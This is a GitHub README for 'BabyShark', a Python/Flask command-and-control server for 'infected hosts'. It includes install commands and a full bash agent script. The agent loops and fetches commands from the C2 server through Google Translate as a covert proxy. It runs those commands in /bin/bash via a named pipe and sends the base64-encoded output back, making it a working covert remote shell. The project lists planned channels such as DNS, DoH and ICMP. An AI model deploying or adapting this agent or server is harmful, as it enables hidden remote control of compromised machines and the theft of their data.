![babyshark](https://repository-images.githubusercontent.com/268794697/4b8cb480-a584-11ea-9dd2-59cd3993dade)

# INTRO
<p style='text-align: justify;'>
This is a basic C2 generic server written in Python and Flask.

This code has based ideia to [GTRS](https://github.com/mthbernardes/GTRS), which uses [Google Translator](https://translate.google.com) as a proxy for sending commands to the infected host. The BabyShark project aims to centralize reverse connections with agents, creating a way to centralize several types of connections in one place. 

BabyShark does not generate infection agents, but it does offer a template to connect to it.
</p>

# INSTALL

```
git clone https://github.com/danilovazb/BabyShark/
cd BabyShark
mkdir database
sqlite3 database/c2.db < schema.sql
```

# AGENTS MODEL

### GTRS - https://github.com/mthbernardes/GTRS

This client example from GTRS for connect to BabyShark:

```bash
#!/bin/bash

if [[ $# < 2 ]];then
    echo -e "Error\nExecute: $0 www.c2server.com secretkey-provided-by-the-server\n"
    exit
fi

running=true
secretkey="b4bysh4rk"
user_agent="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
data="Content-Hype: "
c2server="http://babyshark/momyshark?key=$secretkey"
result=""
input="/tmp/input"
output="/tmp/output"

function namedpipe(){
  rm "$input" "$output"
  mkfifo "$input"
  tail -f "$input" | /bin/bash 2>&1 > $output &
}

function getfirsturl(){
  url="https://translate.google.com/translate?&anno=2&u=$c2server"
  first=$(curl --silent "$url" -H "$user_agent" | xmllint --html --xpath '//iframe/@src' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g' )
} 

function getsecondurl(){
  second=$(curl --silent -L "$first" -H "$user_agent"  | xmllint --html --xpath '//a/@href' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g')
}

function getcommand(){
  if [[ "$result" ]];then  
    command=$(curl -L --silent $second -H "$result" )
  else
    command=$(curl -L --silent $second -H "$user_agent" )

    command1=$(echo "$command" | xmllint --html --xpath '//span[@class="google-src-text"]/text()' - 2>/dev/null)
    command2=$(echo "$command" | xmllint --html --xpath '/html/body/main/div/div/div/div/ul/li/span/text()' - 2>/dev/null )
    if [[ "$command1" ]];then
      command="$command1"
    else
      command="$command2"
    fi
  fi
}

function talktotranslate(){
  getfirsturl
  getsecondurl
  getcommand
}

function main(){
  result=""
  sleep 10
  talktotranslate
  if [[ "$command" ]];then
    if [[ "$command" == "exit" ]];then
      running=false 
    fi
    echo $command
    echo -n > $output
    idcommand=$(echo $command | cut -d '#' -f2)
    echo "$command" > "$input"
    sleep 2
    outputb64=$(cat $output | tr -d '\000'  | base64 | tr -d '\n'  2>/dev/null)
    if [[ "$outputb64" ]];then
      result="$user_agent | $outputb64 | $idcommand "
      talktotranslate
    fi
  fi
}

namedpipe
while "$running";do
  main
done

```
___


# NEXT STEPS



- SSH Reverse
- DNS
- DOH
- HTTPS
- HTTP3
- ICMP
- QUIC
